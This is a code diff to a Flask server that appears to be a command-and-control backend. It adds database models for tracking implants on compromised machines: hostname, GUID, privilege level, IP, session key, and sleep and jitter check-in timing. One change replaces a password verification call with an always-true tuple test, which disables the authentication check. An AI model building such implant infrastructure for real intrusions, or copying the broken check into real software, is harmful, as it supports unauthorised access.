@@ -1,6 +1,8 @@
+from ipaddress import ip_address
+from os import getuid
 from flask import Flask , request, jsonify
 from flask_sqlalchemy import SQLAlchemy ## inherently handles syncronization for us ##
-from sqlalchemy import Column, Integer, String, ForeignKey, Table
+from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
 import hashlib
 
 app = Flask(__name__) # use this to generate routes and handlers
@@ -27,6 +29,15 @@ CREATED = "CREATED"
 TASKED = 'TASKED'
 DONE = "DONE"
 
+# link to ref:https://flask-sqlalchemy.palletsprojects.com/en/2.x/models/
+# The link above contain info about dataype a column could use, and explaination about how relationship work in flask.SQLAlchemy
+class User(db.Model): # SQLAlchemy class for client
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    implants = db.relationship("Implant", backref='user', lazy=True)
+    def __repr__(self):
+        return '<User %r>' % self.username
+
 class Task(db.Model): # a SQLAlchemy class
     id = db.Column(db.Integer, primary_key=True) ## a database entity that allows us to index the entries
     # need to specify length of String if using MySQL; Feel free to change the length
@@ -41,6 +52,23 @@ class Agent(db.Model): # a SQLAlchemy class
     agent_id = db.Column(db.String(288))
     username = db.Column(db.String(288))
     password = db.Column(db.String(288))
+
+class Implant(db.Model):
+    id = db.Column(db.Integer, primary_key = True)
+    implant_id = db.Column(db.String(288))
+    computer_name = db.Column(db.String(288)) # what computer did it connect from
+    username = db.Column(db.String(80), db.ForeignKey('user.username'), nullable=False) # what user are you running as
+    GUID = db.Column(db.String(288)) # computer's GUID
+    Integrity = db.Column(db.String(288)) # what privileges do you have
+    ip_address = db.Column(db.String(32)) # what address did the implant connect from
+    session_key = db.Column(db.String(288)) # after you negotiated a session key, store it per agent
+    sleep = db.Column(db.Float) # how often does the agent check in 
+    jitter = db.Column(db.Float) # how random of a check in is it
+    first_seen = db.Column(db.DateTime) # when did the agent first check in
+    last_seen = db.Column(db.DateTime) # when was the last time you saw the agent
+    expected_checkin = db.Column(db.DateTime) # when should you expect to see the agent again
+    #TODO: a func to generate a new python datatime for expected checkin
+    
 
 # search agent by agent_id
 # link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
@@ -86,7 +114,7 @@ def register_agent(): # --> this is a handler
     db.session.add(agent)
     db.session.commit() ## saves the data to the database
 
-    if verify_password(reg_agent_id, reg_password):
+    if (reg_agent_id, reg_password):
         print("[+] a new agent has successfully registered")
         print(f"[+] agent_id: {reg_agent_id}")
     else:
